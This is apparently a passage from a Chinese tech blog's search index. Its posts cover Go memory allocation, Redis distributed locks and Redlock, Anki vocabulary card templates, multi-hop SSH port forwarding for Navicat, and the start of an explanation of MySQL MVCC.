首先是进程虚拟内存和物理内存映射，用的都是虚拟地址。\n+ Go借鉴的TCMalloc算法，把内存多级管理，mheap，mcentral，mcache(对应GMP的P)。\n+ 小于16字节，mcache，大于32K，mheap，中间先从mache，逐级向上申请。\n\n# 4. 参考资料\n\n+ https://www.cnblogs.com/jiujuan/p/13922551.html\n+ http://legendtkl.com/2017/04/02/golang-alloc/\n+ https://zhuanlan.zhihu.com/p/352133292\n\n+ https://draveness.me/golang/docs/part3-runtime/ch07-memory/golang-memory-allocator/\n\n+ https://learnku.com/articles/68142\n\n\n\n","tags":["golang"],"categories":["2_golang底层"]},{"title":"redis分布式锁的实现","url":"%2Fp%2Fe4e467c6.html","content":"\n# 1. 分布式锁\n\n### 1.1 特点\n\n- 互斥性： 同一时刻只能有一个线程持有锁\n- 可重入性： 同一节点上的同一个线程如果获取了锁之后能够再次获取锁\n- 锁超时：和J.U.C中的锁一样支持锁超时，防止死锁\n- 高性能和高可用： 加锁和解锁需要高效，同时也需要保证高可用，防止分布式锁失效\n- 具备阻塞和非阻塞性：能够及时从阻塞状态中被唤醒\n\n### 1.2 实现方式\n\n我们一般实现分布式锁有以下几种方式：\n\n- 基于数据库\n- 基于Redis\n- 基于zookeeper\n\n<!-- more -->\n\n# 2. Redis实现方案\n\n### 2.1 实现原理\n\n想要实现分布式锁，必须要求 Redis 有「互斥」的能力，我们可以使用 SETNX 命令，这个命令表示SET If Not Exists，即如果 key 不存在，才会设置它的值，否则什么也不做。\n\n加锁命令：SETNX key value，当键不存在时，对键进行设置操作并返回成功，否则返回失败。KEY 是锁的唯一标识，一般按业务来决定命名。\n解锁命令：DEL key，通过删除键值对释放锁，以便其他线程可以通过 SETNX 命令来获取锁。\n锁超时：EXPIRE key timeout, 设置 key 的超时时间，以保证即使锁没有被显式释放，锁也可以在一定时间后自动释放，避免资源被永远锁住。\n\n加锁解锁伪代码如下：\n\n```c\nif (setnx(key, 1) == 1){\n    expire(key, 30)\n    try {\n        //TODO 业务逻辑\n    } finally {\n        del(key)\n    }\n}\n```\n\n### 2.2 加锁\n\n##### SETNX 和 EXPIRE (错误)\n\n如果 SETNX 成功，在设置锁超时时间后，服务器挂掉、重启或网络问题等，导致 EXPIRE 命令没有执行，锁没有设置超时时间变成死锁。\n\n##### SET 原子命令（正确）\n\n从Redis 2.6.12 版本开始，SET命令可以通过参数来实现和SETNX、SETEX、PSETEX 三个命令相同的效果。\n\n```bash\nSET key value NX EX seconds\n```\n\n加上NX、EX参数后，效果就相当于SETEX，这也是Redis获取锁写法里面最常见的。\n\n### 2.3 释放锁\n\n##### VALUE 唯一性\n\nvalue必须要具有唯一性，我们可以用UUID来做，设置随机字符串保证唯一性，至于为什么要保证唯一性？假如value不是随机字符串，而是一个固定值，那么就可能存在下面的问题：\n\n- 1.客户端1获取锁成功\n- 2.客户端1在某个操作上阻塞了太长时间\n- 3.设置的key过期了，锁自动释放了\n- 4.客户端2获取到了对应同一个资源的锁\n- 5.客户端1从阻塞中恢复过来，因为value值一样，所以执行释放锁操作时就会释放掉客户端2持有的锁，这样就会造成问题\n\n所以通常来说，在释放锁时，我们需要对value进行验证\n\n##### GET 后对比自己并 DEL\n\n释放锁时不能直接用del key这种粗暴的方式，因为直接del key任何客户端都可以进行解锁了，所以解锁时，我们需要判断锁是否是自己的，基于value值来判断。\n\n所以我们必须先确保当前释放锁的线程是持有者，没问题了再删除，这样一来，就变成两个步骤了，似乎又违背了原子性了，怎么办呢？我们可以用lua脚本把两步操作做拼装：\n\n```java\npublic boolean releaseLock_with_lua(String key,String value) {\n    String luaScript = \"if redis.call('get',KEYS[1]) == ARGV[1] then \" +\n            \"return redis.call('del',KEYS[1]) else return 0 end\";\n    return jedis.eval(luaScript, Collections.singletonList(key), Collections.singletonList(value)).equals(1L);\n}\n```\n\n\nKEYS[1]是当前key的名称，ARGV[1]可以是当前线程的ID(或者其他不固定的值，能识别所属线程即可)，这样就可以防止持有过期锁的线程，或者其他线程误删现有锁的情况出现。\n\n### 2.3 实现问题总结\n\n##### **死锁**\n\n设置过期时间即可\n\n##### 锁被别人释放\n\n锁写入唯一标识，释放锁先检查标识，再释放。\n\n##### 锁过期时间到了还没干完活\n\n锁的过期时间如果评估不好，这个锁就会有「提前」过期的风险。\n\n加锁时，先设置一个过期时间，然后我们开启一个「守护线程」，定时去检测这个锁的失效时间，如果锁快要过期了，操作共享资源还未完成，那么就自动对锁进行「续期」，重新设置过期时间。\n\n如果你是 Java 技术栈，幸运的是，已经有一个库把这些工作都封装好了：Redisson。\n\n##### 单点问题\n\n1. 客户端 1 在主库上执行 SET 命令，加锁成功\n2. 此时，主库异常宕机，SET 命令还未同步到从库上（主从复制是异步的）\n3. 从库被哨兵提升为新主库，这个锁在新的主库上，丢失了！\n\n为此，Redis 的作者提出一种解决方案，就是我们经常听到的 Redlock（红锁）。\n\n# 3.  Redlock 算法\n\n### 3.1 前提\n\nRedlock 的方案基于 2 个前提：\n\n1. 不再需要部署从库和哨兵实例，只部署主库\n2. 但主库要部署多个，官方推荐至少 5 个实例\n\n也就是说，想用使用 Redlock，你至少要部署 5 个 Redis 实例，而且都是主库，它们之间没有任何关系，都是一个个孤立的实例。\n\n**注意：不是部署 Redis Cluster，就是部署 5 个简单的 Redis 实例。**\n\n### 3.2 流程\n\n整体的流程是这样的，一共分为 5 步：\n\n1. 客户端先获取「当前时间戳T1」\n2. 客户端依次向这 5 个 Redis 实例发起加锁请求（用前面讲到的 SET 命令），且每个请求会设置超时时间（毫秒级，要远小于锁的有效时间），如果某一个实例加锁失败（包括网络超时、锁被其它人持有等各种异常情况），就立即向下一个 Redis 实例申请加锁\n3. 如果客户端从 >=3 个（大多数）以上 Redis 实例加锁成功，则再次获取「当前时间戳T2」，如果 T2 - T1 < 锁的过期时间，此时，认为客户端加锁成功，否则认为加锁失败\n4. 加锁成功，去操作共享资源（例如修改 MySQL 某一行，或发起一个 API 请求）\n5. 加锁失败，向「全部节点」发起释放锁请求（前面讲到的 Lua 脚本释放锁）\n\n### 3.3 争论\n\n参考 Martin 和 redis 作者的争论\n\n红锁的问题在于：加锁和解锁的延迟较大。难以在集群版或者标准版（主从架构）的Redis实例中实现。尽量不用它，而且它的性能不如单机版 Redis，部署成本也高。\n\n# 4. 头脑风暴\n\n+ SET EX PX NX + 校验唯一随机值， 对比后再释放锁。\n\n+ 锁过期了活没干完，就要涉及到续期。\n\n+ JAVA开源框架:Redisson\n\n  只要线程一加锁成功，就会启动一个`watch dog`看门狗，它是一个后台线程，会每隔10秒检查一下，如果线程1还持有锁，那么就会不断的延长锁key的生存时间。因此，Redisson就是使用Redisson解决了锁过期释放，业务没执行完问题。\n\n+ GO的开源库 https://github.com/go-redsync/redsync\n\n# 5. 参考资料\n\n+ https://juejin.cn/post/6844903830442737671\n+ http://kaito-kidd.com/2021/06/08/is-redis-distributed-lock-really-safe/\n+ https://redis.io/topics/distlock\n+ https://github.com/go-redsync/redsync","tags":["redis"],"categories":["redis"]},{"title":"anki之英语单词篇","url":"%2Fp%2Fa2ff337b.html","content":"\n市面上已经有太多的背单词软件，例如百词斩，扇贝，不背单词，墨墨背单词，之前我用的最多的是知米背单词，现在才发现背单词软件的尽头是Anki。\n\n# 1. 单词来源\n\n### 1.1 划词\n\nchrome上遇到不会的单词，直接加入到卡片里。\n\n推荐2个插件，一个是单词发现者。一个是odh划词制卡。\n\n<!-- more -->\n\n+ 单词发现者\n\nhttps://chrome.google.com/webstore/detail/word-discoverer-expand-yo/noncaeikjgpbdeoocblijjgegnobogib?hl=zh-CN\n\n突出显示网页上罕见的英语字典词汇和惯用语。促进英语语言学习并扩大词汇量。可以设置自己的单词量，不认识的单词标红显示。\n\n<img src=\"anki之英语单词篇/image-20220117174933649.png\" alt=\"image-20220117174933649\" style=\"zoom:50%;\" />\n\n+ ODH制卡\n\nhttps://chrome.google.com/webstore/detail/online-dictionary-helper/lppjdajkacanlmpbbcdkccjkdbpllajb?hl=en\n\n遇到不会的单词可以快速Anki制卡，注意这个需要Anki的启动，并且安装了Anki connect的插件。\n\n<img src=\"anki之英语单词篇/image-20220117174845031.png\" alt=\"image-20220117174845031\" style=\"zoom: 50%;\" />\n\n### 1.2 查词\n\n手机上遇到不会的单词，可以进行字典查询，重点推荐欧陆词典。\n\n查完可以加入欧路词典的生词本，然后导出到Anki里。\n\n\n\n### 1.3 COCA20000\n\nCOCA的美国当代语料库中最常用的20000词汇，其形式是包括ed，ing，ly等一个单词的多种形式的真正2万词汇，而不是估算的2万。\n\n做减法的词汇表比做加法的词汇表，要来的有成就感和目的性。因为你知道总量就这些，你会越划越少，而不是每次都在想，还少了点什么。因为超出这个范围的单词，就是不需要背的。\n\n在复习的时候，如果觉得某单词太简单，直接暂停 (suspend) ，以后就不会再跑出来要求复习了。在Anki浏览器里，用 deck:COCA20000 is:suspended(或者deck:COCA20000 -is:suspended) 筛选搁置或者非搁置项。\n\n可以去这个地址下载： https://www.laohuang.net/20170226/anki-coca-20000-source-text/\n\n\n\n# 2. Anki配置\n\n所有插件只能在桌面端使用，不能在移动端使用，并且插件是不会同步的。\n\n### 2.0 安装插件\n\n菜单栏-> 工具 -> 插件 -> 输入插件编码\n\n### 2.1 必装插件\n\n+ AnkiConnect\n\n连接Anki，不装无法chrome快速制卡。\nhttps://ankiweb.net/shared/info/2055492159\n\n### 2.2 编辑字段插件\n\n+ Advanced Browser\n\n可以增加Anki浏览器，对隐藏字段排序。\nhttps://ankiweb.net/shared/info/874215009\n\n+ Fast Word Query\n\n查询单词的各种含义。\nhttps://ankiweb.net/shared/info/1807206748\n\n+ Edit Field During Review\n\n可以在预览的时候，编辑字段。\nhttps://ankiweb.net/shared/info/1020366288\n\n+ Google Translate\n\n可以用字段进行谷歌翻译。\nhttps://ankiweb.net/shared/info/1536291224\n\n### 2.3 使用提升插件\n\n+ Remaining time (for Anki 2.1)\n\n显示背单词进度和状态。\nhttps://ankiweb.net/shared/info/1508357010\n\n+ Speed Focus Mode (auto-alert, auto-reveal, auto-fail)\n\n自动帮你显示答案和不会。\nhttps://ankiweb.net/shared/info/1046608507\n\n### 2.4  夜间模式\n\n新版本可以直接开启夜间模式，不再需要安装插件。不过夜间模式（nightMode）会把页面背景调成深色，若文本颜色仍为黑色（或是深色），读者会根本看不见、或是很难看清文本。\n\nIf you wanted a lighter grey background, you could use something like:\n\n```css\n.card.nightMode { background-color: #555; }\n```\n\nIf you have a ‘myclass’ style, the following would show the text in yellow when night mode is enabled:\n\n```css\n.nightMode .myclass { color: yellow; }\n```\n\n\n\n### 2.5 自动播放特定音频\n\nanki只能设置全局自动播放，和全局非自动播放，可以通过js设置。\n\n1. Create a new options group and uncheck \"Automatically play audio\". You already did that.\n\n2. Put the field with the audio you want to autoplay between divs, spans, etc (see code below).\n\n3. Give an id or class to the div. You can call it whatever you want, but make sure that it matches the ones inside the querySelector. I called mine \"autoplay\".\n\n4. Copy and paste the script below at the end of the section you want the audio to play (Back, in my case).\n\n   ```html\n    <div  id=\"autoplay\">{{de_audio}}</div>\n    \n    <script>\n    \n    \tvar elem = document.querySelector(\"#autoplay .soundLink, #autoplay .replaybutton\");\n    \tif (elem) {\n    \t\telem.click();\n    \t}\n    \n    </script>\n   ```\n\n\n\n# 3. FastWordQuery\n\n### 3.0 导入词库\n\n所有单词来源，我都会通过FastWordQuery进行查词填充字段，然后使用自己配合制作的FastWQ模板。\n\n### 3.1 最终配置\n\n<img src=\"anki%E4%B9%8B%E8%8B%B1%E8%AF%AD%E5%8D%95%E8%AF%8D%E7%AF%87/image-20220117175502987.png\" alt=\"image-20220117175502987\" style=\"zoom:50%;\" />\n\n\n\n<img src=\"anki%E4%B9%8B%E8%8B%B1%E8%AF%AD%E5%8D%95%E8%AF%8D%E7%AF%87/image-20220117175107545.png\" alt=\"image-20220117175107545\" style=\"zoom: 33%;\" />\n\n### 3.2 测试OK配置\n\n<img src=\"anki%E4%B9%8B%E8%8B%B1%E8%AF%AD%E5%8D%95%E8%AF%8D%E7%AF%87/image-20220117175621839.png\" alt=\"image-20220117175621839\" style=\"zoom:32%;\" />\n\n<img src=\"anki%E4%B9%8B%E8%8B%B1%E8%AF%AD%E5%8D%95%E8%AF%8D%E7%AF%87/image-20220117175656109.png\" alt=\"image-20220117175656109\" style=\"zoom: 33%;\" />\n\n### 3.3 fastWQ模板\n\n+ 正面模板\n\n  ```html\n  <div id=\"english\" class=\"section\">{{英语单词}}\n  <span class=\"voice\" id=\"\">{{英音}} </span>\n  <span class=\"voice\" id=\"autoplay\"> {{美音}} </span>\n  \n  <div class=\"phonetic\">{{音标}}</div>\n  <div id=\"star\" class=\"extension\"></div>\n  \n  <div id=\"\" class=\"extension\">{{edit:取词原句}}</div>\n  \n  <div id=\"vocab\" class=\"section\">explain:</div>\n  <div id=\"ext_vocab1\">\n  <div class=\"extension\">{{voc短}}</div>\n  <div class=\"extension\">{{voc长}}</div>\n  </div>\n  \n  <div>\n  <div id=\"kelin1\" class=\"extension\">example:</div>\n  <div id=\"kelin\" class=\"extension\">{{柯林斯}}</div>\n  </div>\n  \n  </div>\n  \n  <script>\n  var str = document.getElementById(\"kelin\").innerHTML;\n  \n  // 柯林斯星级加上\n  var star = \"\";\n  var index = str.indexOf(\"</h4>\");\n  if (index > 0) {\n       star = str.substring(0, index);\n  }\n  document.getElementById(\"star\").innerHTML=star; \n  \n  // 提取例句\n  var output = \"\";\n  var pattern = new RegExp(\"[\\u4E00-\\u9FA5]+\");\n  var arr=str.split(\"<p class=\\\"secondary\\\">\");\n  for (let i = 0; i < arr.length; ++i) {\n      var line = arr[i]\n      var index = line.indexOf(\"</p>\");\n      if (index > 0 && !pattern.test(line)) {\n          var text = line.substring(0, index);\n          output += text + \"\\n\\n\";\n      }\n  }\n  document.getElementById(\"kelin\").innerText=output; \n  \n  // 自动播放\n  var elem = document.querySelector(\"#autoplay .soundLink, #autoplay .replaybutton\"); \n    if (elem) { elem.click(); }\n  \n  </script>\n  ```\n\n\n\n+ 反面模板\n\n  ```html\n  {{FrontSide}}\n  \n  <br>\n  <div>\n  <div id=\"\" class=\"section\">中文意思</div>\n  <div id=\"\" class=\"extension\">{{中文意思}}</div>\n  </div>\n  \n  <br/>\n  <div>\n  <div id=\"\" class=\"section\">柯林斯</div>\n  <div id=\"\" class=\"extension\">{{柯林斯}}</div>\n  </div>\n  \n  <br>\n  <div>\n  <div id=\"\" class=\"section\">英语例句</div>\n  <div id=\"e_sentence\" class=\"extension\">{{英语例句}}</div>\n  </div>\n  \n  <br>\n  <div>\n  <div id=\"\" class=\"section\">英语例句带发音</div>\n  <div id=\"e_sound\" class=\"extension\">{{英语例句带发音}}</div>\n  </div>\n  \n  <br>\n  <div>\n  <div id=\"\" class=\"section\">近义词</div>\n  <div id=\"\" class=\"extension\">{{近义词}}</div>\n  </div>\n  \n  <br>\n  <div>\n  <div id=\"\" class=\"section\">相关词语</div>\n  <div id=\"\" class=\"extension\">{{相关词语}}</div>\n  </div>\n  \n  <br>\n  <div>\n  <div id=\"\" class=\"section\">图片集</div>\n  <div id=\"\" class=\"extension\">{{图片集}}</div>\n  </div>\n  \n  <script type=\"text/javascript\">\n  var initVoice = function () {\n      var player = document.getElementById('dictVoice');\n      document.addEventListener('click', function (e) {\n          var target = e.target;\n          if (target.hasAttribute('role') && target.getAttribute('role').indexOf('dict_audio_js') >= 0) {\n              var url = target.getAttribute('data-rel');\n              player.setAttribute('src', url);\n              player.volume = 1;\n              player.play();\n              e.preventDefault();\n          }\n      }, false);\n  };\n  initVoice();\n  \n  var str = document.getElementById(\"e_sound\").innerHTML;\n  str = str.replace(/channel_title/g, 'e_sound1')\n  document.getElementById(\"e_sound\").innerHTML=str;\n  //document.getElementById(\"e_sound\").innerText=str;\n  \n  </script>\n  \n  <style>\n  .e_sound1 {\n      font-size: 10px;\n  \tcolor: green;\n  \ttext-decoration: none;\n  </style>\n  \n  ```\n\n+ 样式\n\n  ```html\n  </style>\n  \n  <style>\n  @import url('_collins_c.css');\n  \n  .card.nightMode { background-color: #555; }\n  .nightMode .extension { color: #555; }\n  \n  \n  #kelin1{\n   font-size:20px;\n   background:#69ac1d;\n  }\n  \n  \n  #vocab{\n   font-size: 20px;\n   background:#69ac1d;\n   background-image: url('_vocab_logo1.png');\n   background-repeat: no-repeat;\n   background-size:contain;\n  }\n  \n  #collins_1{\n   font-size: 45px;\t\n   background:#69ac1d;\n   background-image: url('_collin_logo.png');\n   background-repeat: no-repeat;\n   background-size:contain;\n  }\n  \n  \n  .card {\n   font-family: sans-serif;\n   font-size: 16px;\n   text-align: left;\n   color:#686868;\n  }\n  \n  .section {\n   color: #444;\n   border-bottom: 3px solid #666;\n   background-color: #fff;\n   margin-top:5px;\n   padding: 10px;\n   position: relative;\n   text-align: left;\n  }\n  \n  .extension {\n   font-size: 16px;\n   line-height: 1.4em;\n   border-bottom: 1px solid #ddd;\n   background-color: #f5f5f5;\n   padding: 10px;\n   display:block;\n  }\n  \n  \n  \n  .word_header_star{\n   font-size: 20px;\n   font-family: 'SS Standard';\n   color: #fdac00;\n   position: absolute;\n   left: 15px;\n   top: 5px;\n  }\n  \n  #english{\n   font-size: 45px;\n   line-height: 80%;\n   padding-bottom:2px;\n  }\n  \n  \n  #chinese a {\n  \ttext-decoration: none;\n  \tpadding: 1px 6px 2px 5px;\n  \tmargin: 0 5px 0 0;\n  \tfont-size: 12px;\n  \tcolor: white;\n  \tfont-weight: normal;\n  \tborder-radius: 4px\n  }\n  \n  #chinese a.pos_n {\n  \tbackground-color: #e3412f\n  }\n  \n  #chinese a.pos_v {\n  \tbackground-color: #539007\n  }\n  \n  #chinese a.pos_a {\n  \tbackground-color: #f8b002\n  }\n  \n  #chinese a.pos_r {\n  \tbackground-color: #684b9d\n  }\n  \n  \n  \n  /* 缺省打开，把block改成none，缺省关闭*/\n  #ext_vocab{\n   display:block;\n  }\n  \n  /* 缺省打开，把block改成none，缺省关闭*/\n  #ext_collins{\n   display:block;\n  }\n  \n  .phonetic{\n   font-size:18px;\n  }\n  \n  .voice img{\n   margin-left:5px;\n   width: 24px;\n   height: 24px;\n  }\n  \n  </style>\n  \n  <script src='_jquery.js'></script>\n  <script>\n  $(document).ready(function(){\n    $.each([\"vocab\",\"collins\"],function(i,x){\n      $(\"#\"+x).click(function(){\n        $(\"#ext_\"+x).slideToggle();\n      });\n      $(\"#ext_\"+x).click(function(){\n        $(\"#ext_\"+x).slideToggle();\n      });\n    });\n  });\n  </script>\n  \n  <style>\n  ```\n\n### 3.4 效果图\n\n<img src=\"anki%E4%B9%8B%E8%8B%B1%E8%AF%AD%E5%8D%95%E8%AF%8D%E7%AF%87/image-20220117182009001.png\" alt=\"image-20220117182009001\" style=\"zoom:32%;\" />\n\n<img src=\"anki%E4%B9%8B%E8%8B%B1%E8%AF%AD%E5%8D%95%E8%AF%8D%E7%AF%87/image-20220117182042685.png\" alt=\"image-20220117182042685\" style=\"zoom:33%;\" />\n\n\n\n# 4. 哲学\n\n### 4.1 英文中的最小单位其实是句子\n\n一个单独的单词，有意义吗？没有！\t**只有一个被句子完全限定住的词，才称得上有意义。**\n\n学者最要的[警语]，是少用堆砌工夫，学时必整句吞下去，再整句吐出来，其文必顺，其音必正，句法必通，用字必当。若凭字字译\t\t成英语，再依文法规则慢慢叠成句读，必一无是处，劳而无补。\n\n### 4.2 英语翻译英语\n\n看英语翻译，一定不要用汉语对应其意思。要用用英语去翻译英语。用英语句子去解释整个单词。\n\n### 4.3 巨量阅读\n\n进行巨量(注意，是巨量不是大量)的阅读，来收集不同的原句中的不同单词，只要不认识就可以收集。\n\n### 4.4 二八原则\n\n投入与产出、努力与收获、原因与结果之间存在着一种不平衡的关系。往往是**关键的少数**决定着事件发展态势，该原则认为，80%的成果来自20%的努力。\n\n普通的一本教辅资料里面大多充斥着废话套话，需要我们人为总结，筛选出那20%的高收益信息。\n\n### 4.5 最低信息原则\n\n一张卡尽量只放一个点，**多于一个知识点的卡片会严重干扰你的学习。** \n\n**有人可能争辩说**最低信息原则导致卡片数量增多，记忆的负担增加，然而现实和你的预想完全相反，正是由于简化了卡片的复杂度，降低了卡片的理解难度，我们在复习卡片时只需花极短的时间。\n\n而且随着时间的推移，熟悉程度的增加，大量卡片会逐渐退出记忆序列，因此加快了记忆效率。\n\n\n\n# 5. 参考资料\n\n+ https://www.laohuang.net/20170226/anki-coca-20000-source-text/\n+ https://ankiweb.net/shared/addons/\n+ [https://sakronos.github.io/Note/2020/07/28/Anki%E5%A4%9C%E9%97%B4%E6%A8%A1%E5%BC%8F/](https://sakronos.github.io/Note/2020/07/28/Anki夜间模式/)\n+ https://www.reddit.com/r/Anki/comments/ioacfp/is_it_possible_to_choose_which_audio_files/\n+ https://zhuanlan.zhihu.com/p/142661482","tags":["english"],"categories":["使用软件"]},{"title":"navicat使用ssh端口多级转发","url":"%2Fp%2Ffc72ccfb.html","content":"\n如果我们要 navicat 连接线上的数据库，一般不允许在本地直接连线上的数据库地址。一般配置 navicat 的 ssh 隧道实现先登上跳板机，再链接数据库。\n\n<img src=\"navicat使用ssh端口多级转发/image-20230413181115088.png\" style=\"zoom: 50%;\" />\n\n可以 navicat 的 ssh 隧道只支持一级，如果是两层怎么办呢？这时候我们可以使用 ssh 端口转发。\n\n<!-- more -->\n\n# 1. ssh 端口转发\n\n### 1.1 ssh config\n\n例如我要去test服务器，去连接数据库，涉及到二级跳转。\n\n```bash\nHost test\n        HostName 172.31.58.22\n        Port 22\n        User web\n        IdentityFile ~/.ssh/web.pem\n        ProxyCommand ssh -q -x -W %h:%p jump\n\nHost jump\n        HostName 13.52.21.111\n        Port 22\n        IdentityFile ~/.ssh/fhyx\n        User ubuntu\n```\n\n\n\n### 1.2 本地开启转发\n\n```bash\n# mysql 代理\nnohup ssh -fvNL localhost:3308:myk0c8.us-west-1.rds.com:3306 ubuntu@test &\n\n\n# mongo 代理\nnohup ssh -fvNL localhost:27018:localhost:27017 ubuntu@test &\n\n```\n\n\n\n### 1.3 navicat配置\n\n只需要连接本地的3308端口就行，自动转发到 test 服务器的 `myk0c8.us-west-1.rds.amazonaws.com:3306`\n\n<img src=\"navicat使用ssh端口多级转发/image-20230413184944395.png\" alt=\"image-20230413184944395\" style=\"zoom:50%;\" />\n\n\n\n# 2. 参考资料\n\n- https://my.oschina.net/yingkui/blog/745093\n- https://www.xiebruce.top/1185.html\n- https://zhuanlan.zhihu.com/p/148825449\n","tags":["ssh"],"categories":["软件"]},{"title":"anki记忆神器的使用","url":"%2Fp%2F9200c91e.html","content":"\nAnki，一个学习辅助记忆工具中封神的存在。\n\n# 1. 使用\n\n### 1.1 安装\n\nmac免费，ios168, 淘宝可以1元购买\n\n<!-- more -->\n\n### 1.2 anki connect 插件\n\nhttps://github.com/FooSoft/anki-connect\n\n注意插件只在client端有用，移动端无用。连接账号推荐使用anki connect， 使用anki web连接有可能会导致封号。\n\n\n\n# 2. 英语学习\n\n### 2.1 单词发现者\n\n我只显示了标红，设置不popup。\n\n<img src=\"anki%E8%AE%B0%E5%BF%86%E7%A5%9E%E5%99%A8%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220108160853572.png\" alt=\"image-20220108160853572\" style=\"zoom:45%;\" />\n\n<img src=\"anki%E8%AE%B0%E5%BF%86%E7%A5%9E%E5%99%A8%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220108160936759.png\" alt=\"image-20220108160936759\" style=\"zoom: 33%;\" />\n\n\n\n### 2.2 在线词典助手  \n\n https://github.com/ninja33/ODH\n\n制作卡片的时候，需要保持mac下anki的启动，才能使用ankiconnect。\n\n<img src=\"anki%E8%AE%B0%E5%BF%86%E7%A5%9E%E5%99%A8%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220108160520630.png\" alt=\"image-20220108160520630\" style=\"zoom:50%;\" />\n\n<img src=\"anki%E8%AE%B0%E5%BF%86%E7%A5%9E%E5%99%A8%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220108160529813.png\" alt=\"image-20220108160529813\" style=\"zoom:50%;\" />\n\n\n\n# 3. 哲学\n\n### 3.1 原则\n\n+ 要拆解内容。\n+ 要用自己的话描述。\n+ 要把问题原子化。\n+ 一张卡尽量只放一个点，**多于一个知识点的卡片会严重干扰你的学习。** \n\n### 3.2 拆分后\n\n总量是一样的，拆分成几个小块逐个击破，任务更轻松；每个知识点的记忆情况可以交由Anki追踪，从而实现有重点的复习。\n\n按知识点划分开来，有很多益处，但唯一的坏处是，这些知识本来关于某个主题，放在一起有联系；现在拆开了，随着一天天的复习，不会拆散吗？\n\n经济的方法是使用标签，过滤牌组可以单独学习一个标签下的卡片，同时不会破坏原有的进程。\n\n### 3.3 折腾\n\n使用Anki的门槛确实比较高。在满足高效的情况下，有人在追求发音完美，有人在追求配色漂亮，有人追求批量制作，有人在追求高速同步，有人在囤积卡片，这些行为对学习的帮助有这么大吗？\n\n在接触Anki的过程中渐渐偏离了当初的目标，开始研究起了工具，**花费大量精力到学习如何用工具上**，却忘了当初想借工具高效学习的目的。\n\n\n\n# 4. 参考资料\n\n+ https://zhuanlan.zhihu.com/p/21328602\n+ https://www.yuque.com/purequant/anki\n+ https://www.laohuang.net/20180213/online-dictionary-helper/\n+ https://www.laohuang.net/20170311/ios-workflow-dict-helper/\n+ https://zhuanlan.zhihu.com/p/112795346\n","tags":["anki"],"categories":["使用软件"]},{"title":"mysql的mvcc实现原理","url":"%2Fp%2Fa0f7945d.html","content":"\n# 1. 基础\n\n### 1.1 MVCC概念\n\nMVCC，全称Multi-Version Concurrency Control，即多版本并发控制。MVCC是一种并发控制的方法，一般在数据库管理系统中，实现对数据库的并发访问，在编程语言中实现事务内存。\n\nMVCC在MySQL InnoDB中的实现主要是为了提高数据库并发性能，用更好的方式去处理读-写冲突，做到即使有读写冲突时，也能做到不加锁，非阻塞并发读。\n\nInnoDB通过undo log保存每条数据的多个版本，并且能够找回数据历史版本提供给用户读，每个事务读到的数据版本可能是不一样的。在同一个事务中，用户只能看到该事务创建快照之前已经提交的修改和该事务本身做的修改。\n\n**MVCC只在 Read Committed 和 Repeatable Read两个隔离级别下工作。**\n\n<!-- more -->\n\n### 1.2 MVCC解决问题\n\n数据库并发场景?有三种, 分别为：\n\n+ 读-读：不存在任何问题，也不需要并发控制\n\n+ 读-写：有线程安全问题，可能会造成事务隔离性问题，可能遇到脏读，幻读，不可重复读\n\n+ 写-写：有线程安全问题，可能会存在更新丢失问题，比如第一类更新丢失，第二类更新丢失\n\n  \n\n**多版本并发控制（MVCC）是一种用来解决读-写冲突的无锁并发控制**，也就是为事务分配单向增长的时间戳，为每个修改保存一个版本，版本与事务时间戳关联，读操作只读该事务开始前的数据库的快照。 所以MVCC可以为数据库解决以下问题\n\n在并发读写数据库时，可以做到在读操作时不用阻塞写操作，写操作也不用阻塞读操作，提高了数据库并发读写的性能 同时还可以解决脏读，幻读，不可重复读等事务隔离问题，但不能解决更新丢失问题。\n\n## 2. 当前度和快照读\n\n### 2.1 当前读(增，改，删，加锁)\n\n像select lock in share mode(共享锁), select for update ; update, insert ,delete(排他锁)这些操作都是一种当前读。\n\n为什么叫当前读？就是它读取的是记录的最新版本，读取时还要保证其他并发事务不能修改当前记录，会对读取的记录进行加锁。\n\n+ 注意，共享锁也是悲观锁。乐观锁和悲观锁是一种编程策略，并不是数据库具有悲观锁和乐观锁。\n\n### 2.2 快照读(普通select)\n\n像不加锁的select操作就是快照读，即不加锁的非阻塞读；快照读的前提是隔离级别不是串行级别，串行级别下的快照读会退化成当前读；\n\n之所以出现快照读的情况，是基于提高并发性能的考虑，快照读的实现是基于多版本并发控制，即MVCC。可以认为MVCC是行锁的一个变种，但它在很多情况下，避免了加锁操作，降低了开销；既然是基于多版本（mysql读取undo log历史版本) ，即快照读可能读到的并不一定是数据的最新版本，而有可能是之前的历史版本。\n\n### 2.3 RC 和 RR 快照读有什么不同\n\n正是Read View生成时机的不同，从而造成RC,RR级别下快照读的结果的不同。\n\n1. Read Committed级别, 事务在begin之后，执行每条select（读操作）语句时，快照会被重置，即会重新创建一个快照(read view)。\n\n2. Repeatable Read级别, 只有事务在begin之后，执行第一条select（读操作）时, 才会创建一个快照(read view)，将当前系统中活跃的其他事务记录起来；并且事务之后都是使用的这个快照，不会重新创建，直到事务结束。\n\n### 2.4 当前读和快照读在RR级别下的区别\n\n+ 查询时机1\n\n<img src=\"mysql的mvcc实现原理/image-20230830140616956.png\" alt=\"image-20230830140616956\" style=\"zoom:30%;\" />\n\n+ 查询时机2\n\n<img src=\"mysql的mvcc实现原理/image-20230830140625481.png\" alt=\"image-20230830140625481\" style=\"zoom:30%;\" />\n\n表2顺序中，事务B在事务A提交后的快照读和当前读都是实时的新数据400，这是为什么呢？\n\n这里与上表的唯一区别仅仅是表1的事务B在事务A修改金额前快照读过一次金额数据，而表2的事务B在事务A修改金额前没有进行过快照读。\n\n所以我们知道事务中快照读的结果是非常依赖该事务首次出现快照读的地方，即某个事务中首次出现快照读的地方非常关键，它有决定该事务后续快照读结果的能力。\n\n我们这里测试的是更新，同时删除和更新也是一样的，如果事务B的快照读是在事务A操作之后进行的，事务B的快照读也是能读取到最新的数据的\n\n\n\n### 2.6 快照读和MVCC的关系\n\nMVCC多版本并发控制指的是 “维持一个数据的多个版本，使得读写操作没有冲突” 这么一个概念。仅仅是一个理想概念。\n\n而在MySQL中，实现这么一个MVCC理想概念，我们就需要MySQL提供具体的功能去实现它，而快照读就是MySQL为我们实现MVCC理想模型的其中一个具体非阻塞读功能。而相对而言，当前读就是悲观锁的具体功能实现。\n\n要说的再细致一些，快照读本身也是一个抽象概念，再深入研究。MVCC模型在MySQL中的具体实现则是由 4个隐式字段，undo日志，Read View 等去完成的。\n\n> 